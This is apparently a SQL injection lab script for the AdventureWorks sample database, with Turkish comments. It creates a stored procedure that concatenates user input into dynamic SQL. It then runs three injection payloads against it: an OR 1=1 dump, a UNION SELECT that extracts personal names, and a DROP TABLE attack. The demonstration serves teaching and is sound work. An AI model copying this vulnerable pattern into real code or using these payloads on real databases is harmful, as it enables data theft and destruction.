USE AdventureWorks2022
GO

-- Savunmasiz (Vulnerable) saklanan yordam: kullanıcı girdisini doğrudan SQL sorgusuna birleştirerek çalıştırır
CREATE OR ALTER PROCEDURE dbo.SearchProduct_Vulnerable
    @SearchTerm NVARCHAR(500)
AS
BEGIN
    DECLARE @sql NVARCHAR(MAX)
    
    -- Guvenlik Acigi: kullanıcı girdisi doğrudan string birleştirme ile sorguya ekleniyor
    SET @sql = N'SELECT ProductID, Name, ProductNumber, ListPrice 
                 FROM Production.Product 
                 WHERE Name = ''' + @SearchTerm + ''''
    
    PRINT 'Executing: ' + @sql  -- olusturulan sorguyu goster
    EXEC(@sql)
END
GO

-- Normal kullanim testi (1 satir donmeli)
EXEC dbo.SearchProduct_Vulnerable @SearchTerm = N'Blade'

-- Saldiri 1: ' OR 1=1 -- enjekte edilerek tablodaki tüm veriler sızdırılır (504 satir)
EXEC dbo.SearchProduct_Vulnerable @SearchTerm = N''' OR 1=1 --'

-- Saldiri 2: UNION SELECT ile baska tablolardan veri cekme
-- Saldirgan, Person tablosundaki kisisel bilgileri sızdırıyor (19972 satir)
EXEC dbo.SearchProduct_Vulnerable @SearchTerm = N''' UNION SELECT BusinessEntityID, FirstName, LastName, CAST(EmailPromotion AS MONEY) FROM Person.Person --'

-- Saldiri 3: DROP TABLE - saldirgan tabloyu tamamen siler
-- Önce test tablosu olustur
CREATE TABLE dbo.TestTable (ID INT, Data NVARCHAR(50))
INSERT INTO dbo.TestTable VALUES (1, 'Test Verisi')
GO

-- Tablonun var oldugunu dogrula
SELECT * FROM dbo.TestTable
GO

-- DROP TABLE saldirisi
EXEC dbo.SearchProduct_Vulnerable @SearchTerm = N'''; DROP TABLE dbo.TestTable; --'
GO

-- Tablonun silindigini dogrula - hata vermeli (tablo artik yok)
SELECT * FROM dbo.TestTable
